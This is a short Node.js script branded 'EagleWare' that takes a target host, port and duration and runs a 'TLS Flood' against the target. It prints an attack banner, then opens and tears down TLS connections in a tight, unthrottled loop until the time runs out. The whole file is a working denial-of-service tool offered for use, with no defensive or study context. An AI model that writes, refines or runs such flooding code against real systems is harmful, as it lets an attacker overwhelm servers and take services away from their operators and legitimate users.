const tls = require('tls');
const process = require('process');

const [,, targetHost, targetPort, duration] = process.argv;

const endtime = Date.now() + (duration ? duration * 1000 : 100000);

const printAttackDetails = () => {
    console.clear();
    const width = process.stdout.columns || 80; 
    console.log(' '.repeat((width - 30) / 2) + "EagleWare Attack Details");
    console.log(' '.repeat((width - 40) / 2) + "╔════════════════════════════════╗");
    console.log(' '.repeat((width - 40) / 2) + ` Target Host: ${targetHost}`);
    console.log(' '.repeat((width - 40) / 2) + ` Target Port: ${targetPort}`);
    console.log(' '.repeat((width - 40) / 2) + ` Duration: ${duration} seconds`);
    console.log(' '.repeat((width - 40) / 2) + ` Method: TLS Flood`);
    console.log(' '.repeat((width - 40) / 2) + "╚════════════════════════════════╝");
};

printAttackDetails();

let connectionCount = 0;

const createConnection = () => {
    if (Date.now() > endtime) {
        console.log(`Total connections made: ${connectionCount}`);
        return;
    }

    const socket = tls.connect(targetPort, targetHost, () => {
        connectionCount++;
        socket.destroy(); 
    });

    socket.on('error', (err) => {
        console.error('Error creating connection:', err);
        socket.destroy();
    });

    setImmediate(createConnection);
};
createConnection();